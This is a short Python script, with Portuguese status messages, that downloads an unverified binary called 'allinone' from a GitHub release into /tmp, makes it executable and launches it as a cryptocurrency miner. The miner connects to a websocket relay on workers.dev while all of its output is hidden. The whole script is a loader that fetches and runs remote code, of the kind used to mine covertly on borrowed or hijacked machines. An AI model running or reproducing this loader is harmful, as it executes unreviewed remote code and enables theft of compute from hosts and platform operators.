```python
import subprocess, os, requests, threading, signal, sys, time

BIN = "https://github.com/conta80297-pixel/testemine123/releases/download/v2-bin/allinone"
URL = "wss://relay2.relay2.workers.dev/"
RAM = 1400

print("Baixando...")
r = requests.get(BIN, timeout=90, allow_redirects=True)
with open("/tmp/allinone", "wb") as f: f.write(r.content)
os.chmod("/tmp/allinone", 0o755)

print("Iniciando minerador...")
p = subprocess.Popen(["/tmp/allinone", "--url", URL, "-l", "100", "--ram", str(RAM), "-i", "auto"],
    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def cleanup(s, f): p.terminate(); p.wait(3); p.kill(); sys.exit(0)
signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)
print(f"Rodando PID {p.pid}")
while p.poll() is None: time.sleep(60)
```
